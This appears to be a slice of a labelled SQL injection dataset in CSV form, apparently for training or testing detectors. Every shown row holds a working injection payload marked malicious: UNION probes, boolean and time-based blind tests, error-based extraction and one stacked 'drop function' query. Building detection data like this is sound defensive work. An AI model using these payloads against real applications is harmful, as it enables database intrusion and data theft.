row_index,payload_norm,label,sqli_type_hint
10020,-7707' ) ) union all select 3172#,1,
10021,waitfor delay '0:0:5'#,1,
10022,"-5082 ) ) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1,
10023,1' ) rlike ( select ( case when ( 2721 = 8716 ) then 1 else 0x28 end ) ) and ( 'dumt' = 'dumt,1,
10024,1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'pehq' like 'pehq,1,
10025,"1 ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10026,"-7796' ) union all select 4960,4960,4960,4960,4960,4960,4960,4960,4960,4960#",1,
10027,"-7499%"" ) union all select 1893,1893,1893,1893,1893#",1,
10028,1' where 2958 = 2958,1,
10029,"1%"" ) and 4595 = 4595#",1,
10030,1' ) as ftyp where 5851 = 5851 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
10031,"1%' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( '%' = '",1,
10032,1' in boolean mode ) and 7533 = 7533#,1,
10033,"1'|| ( select 'yrau' where 7860 = 7860 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1,
10034,1'|| ( select 'tisi' from dual where 1616 = 1616 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||',1,
10035,"-9954"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""bifi"" = ""bifi",1,
10036,"1' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'rpiz' like 'rpiz",1,
10037,"-9953'|| ( select 'zljk' where 2886 = 2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",1,
10038,"1' in boolean mode ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
10039,1' ) ) as fbjd where 8597 = 8597,1,
10040,1 ) ) as ipfy where 1189 = 1189,1,
10041,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( '%' = ',1,
10042,1' ) ) as tlsl where 8467 = 8467,1,
10043,if ( 3392 = 4422 ) select 3392 else drop function xsqq--,1,
10044,"-2718"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""xwbf"" = ""xwbf",1,
10045,1 where 6494 = 6494 and 8463 = 2760,1,
10046,"1' and elt ( 4249 = 4249,7259 )",1,
10047,"1"" and 7533 = 7533 and ""btak"" like ""btak",1,
10048,"1 ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 8600 = 8600",1,
10049,"1' where 5786 = 5786 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
